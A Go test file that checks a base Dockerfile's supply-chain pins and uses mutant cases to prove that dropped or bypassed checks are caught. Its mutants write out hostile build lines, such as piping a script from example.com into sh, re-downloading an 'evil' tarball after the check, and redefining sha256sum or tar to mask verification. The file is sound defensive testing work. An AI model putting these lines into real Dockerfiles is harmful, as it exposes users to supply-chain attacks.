package deskkit

import (
	"os"
	"regexp"
	"runtime"
	"strings"
	"testing"
)

// Supply-chain pins on the base image (#2320, the pinning follow-ups to #2319).
//
// containers/base/Dockerfile names every base image by tag AND digest, and
// checks the Go, gh and Node tarballs with `sha256sum -c` against pinned ARGs
// before it unpacks them, the same way the gitbuild stage checks git (that half
// is pinned by TestBaseImageRunsGitFloor). The image is built only on release,
// so this static check is what makes dropping a pin or a check go red on a PR.

// toolTarball is the reviewed sha256 of one release's linux tarball for each
// architecture the base image builds for.
type toolTarball struct{ amd64, arm64 string }

// knownToolTarballs is the reviewed record of each Go, gh and Node release the
// base image may install, keyed by ARG prefix and then version. Each sha256 was
// read from the vendor's published checksums (go.dev/dl JSON, the gh release's
// checksums file, Node's SHASUMS256.txt) and matched against the downloaded
// tarball when it was added. The Dockerfile's version and both sha256 ARGs must
// be one of these rows, so changing any one of them alone goes red here. A bump
// adds a row in the same change as the Dockerfile (containers/README.md,
// "Pins and checksums").
var knownToolTarballs = map[string]map[string]toolTarball{
	"GO": {"1.25.0": {
		amd64: "2852af0cb20a13139b3448992e69b868e50ed0f8a1e5940ee1de9e19a123b613",
		arm64: "05de75d6994a2783699815ee553bd5a9327d8b79991de36e38b66862782f54ae",
	}},
	"GH": {"2.63.2": {
		amd64: "912fdb1ca29cb005fb746fc5d2b787a289078923a29d0f9ec19a0b00272ded00",
		arm64: "0f31e2a8549c64b5c1679f0b99ce5e0dac7c91da9e86f6246adb8805b0f0b4bb",
	}},
	"NODE": {"22.11.0": {
		amd64: "83bf07dd343002a26211cf1fcd46a9d9534219aad42ee02847816940bf610a72",
		arm64: "6031d04b98f59ff0f7cb98566f65b115ecd893d3b7870821171708cdbaf7ae6e",
	}},
}

// pinnedTool is one tarball the final stage downloads, checks and unpacks.
type pinnedTool struct {
	arg  string // ARG prefix: <arg>_VERSION, <arg>_SHA256_AMD64, <arg>_SHA256_ARM64
	file string // where the RUN downloads it
	tar  string // the command that unpacks it
}

var basePinnedTools = []pinnedTool{
	{"GO", "/tmp/go.tgz", "tar -C /usr/local --no-same-owner -xzf /tmp/go.tgz"},
	{"GH", "/tmp/gh.tgz", "tar -C /tmp -xzf /tmp/gh.tgz"},
	{"NODE", "/tmp/node.txz", "tar -C /usr/local --no-same-owner --strip-components=1 -xJf /tmp/node.txz"},
}

// digestRef is an image reference carrying both a tag and a sha256 digest.
var digestRef = regexp.MustCompile(`^[a-z0-9][a-z0-9._/-]*:[A-Za-z0-9_][A-Za-z0-9_.-]*@sha256:[0-9a-f]{64}$`)

// basePinProblem returns why a base Dockerfile does not hold its supply-chain
// pins, or "" when it does. It requires:
//   - every FROM (after resolving a pre-FROM ARG) names `<name>:<tag>@sha256:…`,
//     and every debian stage names the same reference, since the git built in
//     one stage links against the other's libraries;
//   - the final stage pins each tool's version and both per-arch sha256 ARGs
//     to a reviewed row in knownToolTarballs;
//   - a `# syntax=` parser directive, if present, names its frontend image by
//     tag and digest too;
//   - no ENV sets a pinned version, sha256 or image name, which would override
//     the reviewed ARG inside the RUN that reads it;
//   - each tool's RUN, fail-closed, maps TARGETARCH to that tool's own ARG,
//     downloads once over https only, runs a bare
//     `echo "${sha}  <file>" | sha256sum -c -`, and unpacks as the very next
//     command, so nothing can replace the file between the check and the tar;
//   - unpinnedFetchProblem holds.
func basePinProblem(dockerfile string) string {
	if p := syntaxDirectiveProblem(dockerfile); p != "" {
		return p
	}
	ins := parseDockerfile(dockerfile)
	pinned := map[string]bool{"DESK_TOOLS_IMAGE": true, "GIT_VERSION": true, "GIT_TARBALL_SHA256": true}
	for _, tl := range basePinnedTools {
		for _, s := range []string{"_VERSION", "_SHA256_AMD64", "_SHA256_ARM64"} {
			pinned[tl.arg+s] = true
		}
	}
	names := make([]string, 0, len(pinned))
	for k := range pinned {
		names = append(names, k)
	}
	// `NAME=`, `export NAME=`, `${NAME=…}` or `${NAME:=…}` inside a RUN.
	shellAssign := regexp.MustCompile(`(?:^|[^A-Za-z0-9_])(` + strings.Join(names, "|") + `):?=`)
	for _, in := range ins {
		switch in.op {
		case "ENV":
			for i, a := range in.args {
				// `ENV <key>=<value> …`, or the legacy `ENV <key> <value>`.
				if k, _, ok := strings.Cut(a, "="); (ok || i == 0) && pinned[k] {
					return "an ENV sets " + k + ", which overrides the reviewed ARG of that name"
				}
			}
		case "RUN":
			for _, sg := range in.segs {
				if m := shellAssign.FindStringSubmatch(sg); m != nil {
					return "a RUN assigns " + m[1] + " (`" + sg + "`), which overrides the reviewed ARG of that name"
				}
			}
		}
	}
	globals := map[string]string{}
	lastFrom, debianRef := -1, ""
	for i, in := range ins {
		if in.op == "ARG" && lastFrom < 0 && len(in.args) == 1 {
			if k, v, ok := strings.Cut(in.args[0], "="); ok {
				globals[k] = v
			}
		}
		if in.op != "FROM" {
			continue
		}
		lastFrom = i
		ref := ""
		for _, a := range in.args {
			if !strings.HasPrefix(a, "--") {
				ref = a
				break
			}
		}
		if strings.HasPrefix(ref, "${") && strings.HasSuffix(ref, "}") {
			ref = globals[strings.TrimSuffix(strings.TrimPrefix(ref, "${"), "}")]
		}
		if !digestRef.MatchString(ref) {
			return "FROM `" + strings.Join(in.args, " ") + "` resolves to `" + ref + "`, not a `<name>:<tag>@sha256:<digest>` reference"
		}
		if strings.HasPrefix(ref, "debian:") {
			if debianRef != "" && ref != debianRef {
				return "the debian stages name different references (" + debianRef + " and " + ref + ")"
			}
			debianRef = ref
		}
	}
	if lastFrom < 0 {
		return "no FROM"
	}
	if p := unpinnedFetchProblem(ins); p != "" {
		return p
	}
	args := map[string]string{}
	for _, in := range ins[lastFrom+1:] {
		if in.op == "ARG" && len(in.args) == 1 {
			if k, v, ok := strings.Cut(in.args[0], "="); ok {
				args[k] = v
			}
		}
	}
	for _, tl := range basePinnedTools {
		ver := args[tl.arg+"_VERSION"]
		amd, arm := args[tl.arg+"_SHA256_AMD64"], args[tl.arg+"_SHA256_ARM64"]
		if rec, ok := knownToolTarballs[tl.arg][ver]; !ok || amd != rec.amd64 || arm != rec.arm64 {
			return "the final stage pins " + tl.arg + "_VERSION=" + ver + " " + tl.arg + "_SHA256_AMD64=" + amd + " " +
				tl.arg + "_SHA256_ARM64=" + arm + ", which is not a reviewed row in knownToolTarballs"
		}
		var run *dfInstr
		for i := lastFrom + 1; i < len(ins); i++ {
			if ins[i].op != "RUN" {
				continue
			}
			for _, sg := range ins[i].segs {
				if fetchWords(sg) > 0 && strings.HasSuffix(sg, " -o "+tl.file) {
					if run != nil && run != &ins[i] {
						return "more than one RUN downloads " + tl.file
					}
					run = &ins[i]
				}
			}
		}
		if run == nil {
			return "no final-stage RUN downloads " + tl.file
		}
		if p := toolRunProblem(*run, tl); p != "" {
			return "the " + tl.file + " RUN " + p
		}
	}
	return ""
}

// checkedDownloads maps the only files a RUN may fetch to the stage allowed to
// fetch each ("" is the final stage). Each is checked against a pinned sha256
// in that stage before use: git by TestBaseImageRunsGitFloor, the others by
// toolRunProblem.
func checkedDownloads() map[string]string {
	files := map[string]string{"/tmp/git.txz": "gitbuild"}
	for _, tl := range basePinnedTools {
		files[tl.file] = ""
	}
	return files
}

// fetchTools are the commands that fetch over the network. A word names one
// whatever path or quoting it carries: `curl`, `/usr/bin/curl`, `'curl` (inside
// `sh -c '…'`) and `["curl",` (an exec-form RUN) all count.
var fetchTools = map[string]bool{"curl": true, "wget": true}

// gitFetchVerbs are the git subcommands that bring in a remote's objects.
var gitFetchVerbs = map[string]bool{"clone": true, "fetch": true, "pull": true, "submodule": true}

// shellWord splits a command's text into the bare words a shell could run, so
// a fetch tool is found after `then`, `timeout 60`, `env X=y`, `sh -c '`, a
// pipe, a substitution or an exec-form `[`, not only at the command's start.
func shellWords(sg string) []string {
	var out []string
	for _, f := range strings.FieldsFunc(sg, func(r rune) bool {
		return r == ' ' || r == '\t' || strings.ContainsRune("|&;()`<>,[]{}$!", r)
	}) {
		if f = strings.NewReplacer(`"`, "", `'`, "", `\`, "").Replace(f); f != "" {
			out = append(out, f[strings.LastIndex(f, "/")+1:])
		}
	}
	return out
}

// fetchWords counts the fetches one shell command makes: each word that names
// a fetch tool, plus one for a git fetch verb beside a `git`. The one exception
// is a plain `apt-get install` list, where a bare `curl` or `wget` is a package
// name (apt itself is not pinned to exact bytes; containers/README.md).
func fetchWords(sg string) int {
	f := strings.Fields(sg)
	aptList := len(f) > 2 && f[0] == "apt-get" && hasWord(f, "install") && !strings.ContainsAny(sg, "|&$`()<>'\"")
	n, git, gitVerb := 0, false, false
	for _, w := range shellWords(sg) {
		if fetchTools[w] && !(aptList && hasWord(f, w)) {
			n++
		}
		git = git || w == "git"
		gitVerb = gitVerb || gitFetchVerbs[w]
	}
	if git && gitVerb {
		n++
	}
	return n
}

// allowedCurl is the one download shape the base image uses, word for word:
// fixed flags, one quoted https URL (or "$url"), and one `-o <file>`. Any other
// flag (`--output`, `-O`, `-oX`, `-K`, …) could write a second, unchecked file
// or read more options, so it is refused rather than parsed.
var allowedCurl = regexp.MustCompile(`^curl -fsSL ` + regexp.QuoteMeta(gitCurlHTTPSOnly) +
	` "(?:\$url|https://[A-Za-z0-9._/${}-]+)" -o (/tmp/[A-Za-z0-9._-]+)$`)

// plainCurlFile returns the file a command downloads when it is exactly the
// allowedCurl shape and makes no other fetch.
func plainCurlFile(sg string) (string, bool) {
	m := allowedCurl.FindStringSubmatch(sg)
	if m == nil || fetchWords(sg) != 1 {
		return "", false
	}
	return m[1], true
}

// redefinesCheckCommand finds a shell function or alias named for a command
// the download, check or unpack runs, which would mask the check.
var redefinesCheckCommand = regexp.MustCompile(`(?:^|[\s;&|(){}])(?:function\s+)?(sha256sum|tar|curl|echo)\s*\(\s*\)|\balias\s+(sha256sum|tar|curl|echo)=`)

// scpRemote is a git remote in scp form (`git@host:path`), which ADD fetches.
var scpRemote = regexp.MustCompile(`^[^/@\s]+@[^/:\s]+:`)

// unpinnedFetchProblem is the class guard: it returns why any instruction
// brings in outside bytes with no pin, wherever it sits. A FROM is checked
// above. Here a COPY or ADD --from, or a RUN --mount from=, that names an image
// rather than a stage must carry a digest; an ADD may not fetch a URL or a git
// remote; no instruction may carry a heredoc, which the parser cannot read;
// there is no ONBUILD, whose wrapped instruction would run in every image built
// FROM this one; a RUN may not redefine sha256sum, tar, curl or echo; and a RUN
// may fetch only with the exact allowedCurl shape, writing a file
// checkedDownloads allows in that stage. It is lexical: it reads the forms
// above, and a fetcher it has no word for (a package manager, a script
// interpreter, a command name built from a variable) still needs a reviewer's
// eye.
func unpinnedFetchProblem(ins []dfInstr) string {
	stages, files := map[string]bool{}, checkedDownloads()
	lastFrom := -1
	for i, in := range ins {
		if in.op == "FROM" {
			lastFrom = i
		}
		if n := len(in.args); in.op == "FROM" && n >= 3 && in.args[n-2] == "AS" {
			stages[in.args[n-1]] = true
		}
	}
	unpinnedImage := func(from string) bool { return !stages[from] && !digestRef.MatchString(from) }
	stage := ""
	for i, in := range ins {
		if in.op == "FROM" {
			stage = "?"
			if n := len(in.args); n >= 3 && in.args[n-2] == "AS" {
				stage = in.args[n-1]
			}
			if i == lastFrom {
				stage = ""
			}
		}
		for _, a := range in.args {
			if strings.Contains(a, "<<") {
				return in.op + " carries a heredoc (`" + a + "`), which this check does not read"
			}
		}
		switch in.op {
		case "ONBUILD":
			return "ONBUILD `" + strings.Join(in.args, " ") + "` would run in every image built FROM this one, and this check does not read it"
		case "COPY", "ADD":
			for _, a := range in.args {
				if from, ok := strings.CutPrefix(a, "--from="); ok && unpinnedImage(from) {
					return in.op + " " + a + " names an image without a tag and digest"
				}
				if in.op == "ADD" && (strings.Contains(a, "://") || scpRemote.MatchString(a)) {
					return "ADD fetches " + a + " with no checksum"
				}
			}
		case "RUN":
			for _, a := range in.args {
				opts, ok := strings.CutPrefix(a, "--mount=")
				for _, o := range strings.Split(opts, ",") {
					if from, isFrom := strings.CutPrefix(o, "from="); ok && isFrom && unpinnedImage(from) {
						return "RUN " + a + " mounts an image without a tag and digest"
					}
				}
			}
			for _, sg := range in.segs {
				if m := redefinesCheckCommand.FindStringSubmatch(sg); m != nil {
					return "a RUN redefines `" + m[1] + m[2] + "` (`" + sg + "`), which would mask the check"
				}
				if fetchWords(sg) == 0 {
					continue
				}
				out, plain := plainCurlFile(sg)
				if want, ok := files[out]; !plain || !ok || want != stage {
					return "a RUN fetches with no pinned checksum (`" + sg + "`)"
				}
			}
		}
	}
	return ""
}

// parserDirective is one `# key=value` parser directive, as BuildKit reads it.
var parserDirective = regexp.MustCompile(`^#[ \t]*([A-Za-z][A-Za-z0-9]*)[ \t]*=[ \t]*(.*?)[ \t]*$`)

// syntaxDirectiveProblem returns why the parser directives at the top of the
// file are not ones this check can trust: a `# syntax=` that pulls its BuildKit
// frontend by a floating tag, or any other directive (`escape` moves the line
// continuation, so parseDockerfile would misread every RUN). With no `syntax`
// directive, BuildKit uses the frontend built into the builder and pulls
// nothing.
func syntaxDirectiveProblem(dockerfile string) string {
	for _, l := range strings.Split(dockerfile, "\n") {
		m := parserDirective.FindStringSubmatch(strings.TrimSpace(l))
		if m == nil {
			break // directives end at the first line that is not one
		}
		switch {
		case !strings.EqualFold(m[1], "syntax"):
			return "the `" + l + "` parser directive changes how the file is read, and this check assumes the defaults"
		case !digestRef.MatchString(m[2]):
			return "the `" + l + "` directive names its frontend without a tag and digest"
		}
	}
	return ""
}

// toolRunProblem returns why one tool's RUN could unpack a tarball it has not
// checked against that tool's pinned sha256.
func toolRunProblem(in dfInstr, tl pinnedTool) string {
	if p := failClosedProblem(in.args); p != "" {
		return p
	}
	amdWord := `sha="${` + tl.arg + `_SHA256_AMD64}"`
	armWord := `sha="${` + tl.arg + `_SHA256_ARM64}"`
	shaCmd := `echo "${sha} ` + tl.file + `" | sha256sum -c -`
	curl, amdArm, armArm, sha, tar := -1, -1, -1, -1, -1
	for i, sg := range in.segs {
		// The first case arm shares its command with `case "${TARGETARCH}" in`.
		arm := sg
		if strings.HasPrefix(arm, `case "${TARGETARCH}" in `) {
			arm = strings.TrimPrefix(arm, `case "${TARGETARCH}" in `)
		}
		words := strings.Fields(arm)
		setsSha := false
		for _, w := range words {
			setsSha = setsSha || strings.HasPrefix(w, "sha=")
		}
		switch {
		case fetchWords(sg) > 0:
			if curl >= 0 {
				return "downloads more than once, so the file unpacked need not be the file checked"
			}
			// allowedCurl carries the https-only flags, so a redirect cannot
			// leave https.
			if out, ok := plainCurlFile(sg); !ok || out != tl.file {
				return "fetches with something other than the one allowed curl shape writing " + tl.file + " (`" + sg + "`)"
			}
			curl = i
		case strings.HasPrefix(arm, "amd64) "):
			if !hasWord(words, amdWord) {
				return "does not set " + amdWord + " for amd64 (`" + arm + "`)"
			}
			amdArm = i
		case strings.HasPrefix(arm, "arm64) "):
			if !hasWord(words, armWord) {
				return "does not set " + armWord + " for arm64 (`" + arm + "`)"
			}
			armArm = i
		case setsSha:
			return "sets sha outside the TARGETARCH case (`" + sg + "`), so the check need not use the pinned ARG"
		case sg == shaCmd:
			sha = i
		case sg == tl.tar:
			tar = i
		}
	}
	switch {
	case amdArm < 0 || armArm < 0:
		return "does not map amd64 to " + amdWord + " and arm64 to " + armWord
	case sha < 0:
		return "has no bare `" + shaCmd + "` command"
	case curl < 0 || tar < 0:
		return "does not both download " + tl.file + " and unpack it with `" + tl.tar + "`"
	case !(amdArm < sha && armArm < sha && curl < sha && sha < tar):
		return "does not choose the pinned sha256 and download, then check, then unpack"
	case tar != sha+1:
		return "runs `" + in.segs[sha+1] + "` between the check and the unpack, so the file unpacked need not be the file checked"
	}
	return ""
}

// TestBaseImagePinsTarballs pins the supply-chain half of the base Dockerfile:
// the real file holds every pin and check, and each mutant that drops, masks,
// reorders or swaps one is caught.
func TestBaseImagePinsTarballs(t *testing.T) {
	if runtime.GOOS == "windows" {
		t.Skip("the base Dockerfile is a Linux build input; its mutant anchors assume an LF checkout")
	}
	skipIfFixtureAbsent(t, baseDockerfilePath, "containers/ is not part of this repository's published file set")
	raw, err := os.ReadFile(baseDockerfilePath)
	if err != nil {
		t.Fatal(err)
	}
	text := string(raw)
	if p := basePinProblem(text); p != "" {
		t.Fatalf("containers/base/Dockerfile: %s", p)
	}

	once := func(anchor string) string {
		t.Helper()
		if strings.Count(text, anchor) != 1 {
			t.Fatalf("the mutants below need %q exactly once in the Dockerfile", anchor)
		}
		return anchor
	}
	swap := func(old, repl string) string { return strings.Replace(text, once(old), repl, 1) }

	debianRef := regexp.MustCompile(`debian:bookworm-slim@sha256:[0-9a-f]{64}`).FindString(text)
	deskTools := regexp.MustCompile(`(?m)^ARG DESK_TOOLS_IMAGE=(\S+)@(sha256:[0-9a-f]{64})$`).FindStringSubmatch(text)
	if debianRef == "" || deskTools == nil {
		t.Fatal("the mutants below need a digest-pinned debian FROM and DESK_TOOLS_IMAGE ARG")
	}
	gitbuildFrom := once("FROM " + debianRef + " AS gitbuild\n")
	finalFrom := once("FROM " + debianRef + "\n")
	deskToolsArg := once(deskTools[0])
	otherDigest := "sha256:" + strings.Repeat("ab", 32)
	syntax := regexp.MustCompile(`^# syntax=\S+@sha256:[0-9a-f]{64}\n`).FindString(text)
	if syntax == "" {
		t.Fatal("the mutants below need a digest-pinned `# syntax=` directive on line 1")
	}

	mutants := map[string]string{
		"desk-tools digest dropped": swap(deskToolsArg, "ARG DESK_TOOLS_IMAGE="+deskTools[1]),
		"desk-tools tag dropped":    swap(deskToolsArg, "ARG DESK_TOOLS_IMAGE="+strings.Split(deskTools[1], ":")[0]+"@"+deskTools[2]),
		"desk-tools digest short":   swap(deskToolsArg, deskToolsArg[:len(deskToolsArg)-1]),
		"gitbuild digest dropped":   swap(gitbuildFrom, "FROM debian:bookworm-slim AS gitbuild\n"),
		"final digest dropped":      swap(finalFrom, "FROM debian:bookworm-slim\n"),
		"final tag dropped":         swap(finalFrom, "FROM debian@"+strings.Split(debianRef, "@")[1]+"\n"),
		"debian stages diverge":     swap(gitbuildFrom, "FROM debian:bookworm-slim@"+otherDigest+" AS gitbuild\n"),
		"final FROM via bare ARG":   swap(finalFrom, "ARG FINAL_BASE=debian:bookworm-slim\nFROM ${FINAL_BASE}\n"),
		"syntax frontend floats":    swap(syntax, "# syntax=docker/dockerfile:1\n"),
		"syntax frontend unspaced":  swap(syntax, "#syntax = docker/dockerfile:1\n"),
		// Another parser directive changes how the file is read (`escape`
		// moves the line continuation), so the parser below would misread it.
		"escape directive": swap(syntax, syntax+"# escape=`\n"),
	}
	// The class guard: a new unpinned fetch planted at a site this change does
	// not touch must go red too, not just the four pinned downloads.
	plugin := "COPY plugins/assay/ /opt/assay/plugin/\n"
	for name, plant := range map[string]string{
		"new unchecked curl":         "RUN set -eux; curl -fsSL https://example.com/t.tgz -o /tmp/t.tgz; tar -C /tmp -xzf /tmp/t.tgz\n",
		"curl piped to sh":           "RUN curl -fsSL https://example.com/i.sh | sh\n",
		"wget download":              "RUN wget -q https://example.com/t.tgz -O /tmp/t.tgz\n",
		"curl in a substitution":     "RUN set -eux; v=\"$(curl -fsSL https://example.com/v)\"; echo \"$v\"\n",
		"ADD from a URL":             "ADD https://example.com/t.tgz /tmp/t.tgz\n",
		"COPY --from unpinned image": "COPY --from=alpine:3.21 /bin/busybox /bin/busybox\n",
		"git tarball in final stage": "RUN set -eux; curl -fsSL " + gitCurlHTTPSOnly + " https://example.com/g.txz -o /tmp/git.txz\n",
		// A fetch is a curl or wget anywhere in a command, not only at its start.
		"curl after then":                 "RUN set -eux; if true; then curl -fsSL https://example.com/t.tgz -o /tmp/t.tgz; fi\n",
		"curl under timeout":              "RUN set -eux; timeout 300 curl -fsSL https://example.com/t.tgz -o /tmp/t.tgz\n",
		"curl by absolute path":           "RUN set -eux; /usr/bin/curl -fsSL https://example.com/t.tgz -o /tmp/t.tgz\n",
		"curl under env":                  "RUN set -eux; env HOME=/tmp curl -fsSL https://example.com/t.tgz -o /tmp/t.tgz\n",
		"curl in sh -c":                   "RUN set -eux; sh -c 'curl -fsSL https://example.com/i.sh | sh'\n",
		"wget in sh -c":                   "RUN set -eux; sh -c \"wget -q https://example.com/t.tgz -O /tmp/t.tgz\"\n",
		"exec-form curl":                  `RUN ["curl", "-fsSL", "https://example.com/t.tgz", "-o", "/tmp/t.tgz"]` + "\n",
		"heredoc RUN":                     "RUN <<EOT\ncurl -fsSL https://example.com/i.sh | sh\nEOT\n",
		"RUN --mount from unpinned image": "RUN --mount=type=bind,from=alpine:3.21,target=/m cp /m/bin/busybox /usr/local/bin/\n",
		"ADD of a git remote":             "ADD git@github.com:example/r.git /opt/r\n",
		"git clone":                       "RUN set -eux; git clone https://example.com/r.git /opt/r\n",
		// An ONBUILD trigger runs in every image built FROM this one.
		"ONBUILD RUN curl piped to sh": "ONBUILD RUN curl -fsSL https://example.com/i.sh | sh\n",
		"ONBUILD ADD from a URL":       "ONBUILD ADD https://example.com/t.tgz /tmp/t.tgz\n",
		"alias redefines tar":          "RUN set -eux; alias tar=true; tar -xzf /tmp/t.tgz\n",
	} {
		mutants["class: "+name] = swap(plugin, plant+plugin)
	}
	// A plain curl that writes the one file its stage may fetch, chained after
	// an unchecked one: the last `-o` names an allowed file, the first does not.
	gitShaArg := once("ARG GIT_TARBALL_SHA256=" + knownGitTarballs["2.56.0"] + "\n")
	mutants["class: curl chained before an allowed one"] = swap(gitShaArg, gitShaArg+
		"RUN set -eux; curl -fsSL https://example.com/t.tgz -o /tmp/t.tgz && curl -fsSL "+gitCurlHTTPSOnly+" https://example.com/g.txz -o /tmp/git.txz\n")
	// The gitbuild download is held to the same exact curl shape and the same
	// no-reassignment rule as the three tool downloads.
	gitCurl := once("    curl -fsSL " + gitCurlHTTPSOnly + " \\\n")
	mutants["class: gitbuild curl second output -O"] = swap(gitCurl, "    curl -fsSL "+gitCurlHTTPSOnly+" -O https://example.com/t.tgz \\\n")
	mutants["class: gitbuild shell assignment overrides sha"] = swap(gitCurl, "    GIT_TARBALL_SHA256="+strings.Repeat("0", 64)+"; \\\n"+gitCurl)
	for _, tl := range basePinnedTools {
		rec := knownToolTarballs[tl.arg]
		var ver string
		for v := range rec {
			ver = v
		}
		verArg := "ARG " + tl.arg + "_VERSION=" + ver + "\n"
		amdArg := "ARG " + tl.arg + "_SHA256_AMD64=" + rec[ver].amd64 + "\n"
		armArg := "ARG " + tl.arg + "_SHA256_ARM64=" + rec[ver].arm64 + "\n"
		shaLine := `    echo "${sha}  ` + tl.file + `" | sha256sum -c -; \` + "\n"
		tarLine := "    " + tl.tar + "; \\\n"
		amdWord := `sha="${` + tl.arg + `_SHA256_AMD64}"`
		armWord := `sha="${` + tl.arg + `_SHA256_ARM64}"`
		curlLine := "    curl -fsSL " + gitCurlHTTPSOnly + ` "$url" -o ` + tl.file + "; \\\n"
		shaCmd := func(repl string) string {
			return swap(shaLine, strings.Replace(shaLine, "sha256sum -c -;", repl, 1))
		}
		p := tl.arg + ": "
		for name, m := range map[string]string{
			"sha256 check dropped":      swap(shaLine, ""),
			"sha256 check masked":       shaCmd("sha256sum -c - || true;"),
			"sha256 check && true":      shaCmd("sha256sum -c - && true;"),
			"sha256 check piped":        shaCmd("sha256sum -c - | cat;"),
			"sha256 check backgrounded": shaCmd("sha256sum -c - & wait;"),
			"sha256 check negated":      swap(shaLine, strings.Replace(shaLine, "echo ", "! echo ", 1)),
			"sha256 check in an if":     swap(shaLine, strings.Replace(strings.Replace(shaLine, "echo ", "if echo ", 1), "sha256sum -c -;", "sha256sum -c -; then :; fi;", 1)),
			"exit 0 before sha256":      swap(shaLine, "    exit 0; \\\n"+shaLine),
			"hash checked after unpack": strings.Replace(swap(tarLine, ""), shaLine, tarLine+shaLine, 1),
			"sha self-computed":         swap(shaLine, `    sha="$(sha256sum `+tl.file+` | cut -d' ' -f1)"; \`+"\n"+shaLine),
			"second download after":     swap(shaLine, shaLine+curlLine),
			"curl https-only dropped":   swap(curlLine, "    curl -fsSL \"$url\" -o "+tl.file+"; \\\n"),
			"amd64 arm cross-wired":     swap(amdWord+" ;;", armWord+" ;;"),
			"arm64 arm cross-wired":     swap(armWord+" ;;", amdWord+" ;;"),
			"amd64 sha256 ARG swapped":  swap(amdArg, "ARG "+tl.arg+"_SHA256_AMD64="+strings.Repeat("0", 64)+"\n"),
			"arm64 sha256 ARG swapped":  swap(armArg, "ARG "+tl.arg+"_SHA256_ARM64="+strings.Repeat("0", 64)+"\n"),
			"version bumped alone":      swap(verArg, "ARG "+tl.arg+"_VERSION="+ver+"9\n"),
			"sha256 ARG dropped":        swap(amdArg, ""),
			// Between the check and the unpack nothing may touch the file, and
			// a re-download there is caught however it is spelled.
			"refetch after then":     swap(shaLine, shaLine+"    if true; then curl -fsSL https://example.com/evil.tgz -o "+tl.file+"; fi; \\\n"),
			"refetch under timeout":  swap(shaLine, shaLine+"    timeout 60 curl -fsSL https://example.com/evil.tgz -o "+tl.file+"; \\\n"),
			"refetch in sh -c":       swap(shaLine, shaLine+`    sh -c "curl -fsSL https://example.com/x -o `+tl.file+`"; \`+"\n"),
			"file replaced by cp":    swap(shaLine, shaLine+"    cp /etc/hostname "+tl.file+"; \\\n"),
			"curl chained before":    swap(curlLine, "    curl -fsSL https://example.com/t.tgz -o /tmp/t.tgz && "+strings.TrimPrefix(curlLine, "    ")),
			"curl writes two files":  swap(curlLine, strings.Replace(curlLine, `"$url"`, `https://example.com/t.tgz -o /tmp/t.tgz "$url"`, 1)),
			"ENV overrides the pins": swap(armArg, armArg+"ENV "+tl.arg+"_VERSION="+ver+"9 "+tl.arg+"_SHA256_AMD64="+strings.Repeat("0", 64)+"\n"),
			// The allowed curl is one exact shape: any other way to name a
			// second output, or to read more options, goes red.
			"curl second output --output": swap(curlLine, strings.Replace(curlLine, `"$url"`, `https://example.com/t.tgz --output /tmp/t.tgz "$url"`, 1)),
			"curl second output -O":       swap(curlLine, strings.Replace(curlLine, `"$url"`, `-O https://example.com/t.tgz "$url"`, 1)),
			"curl second output -oX":      swap(curlLine, strings.Replace(curlLine, `"$url"`, `-o/tmp/t.tgz https://example.com/t.tgz "$url"`, 1)),
			"curl reads a -K config":      swap(curlLine, strings.Replace(curlLine, `"$url"`, `-K /tmp/cfg "$url"`, 1)),
			// The reviewed ARG may not be reassigned inside the RUN, and the
			// commands the check and the unpack run may not be redefined.
			"shell assignment overrides sha": swap(curlLine, "    "+tl.arg+"_SHA256_AMD64="+strings.Repeat("0", 64)+"; \\\n"+curlLine),
			"sha256sum redefined":            swap(curlLine, "    sha256sum() { return 0; }; \\\n"+curlLine),
		} {
			mutants[p+name] = m
		}
	}
	for name, m := range mutants {
		if m == text {
			t.Fatalf("mutant %q did not change the Dockerfile", name)
		}
		if p := basePinProblem(m); p == "" {
			t.Errorf("mutant %q: the dropped pin was not caught", name)
		} else {
			t.Logf("mutant %q caught: %s", name, p)
		}
	}
}
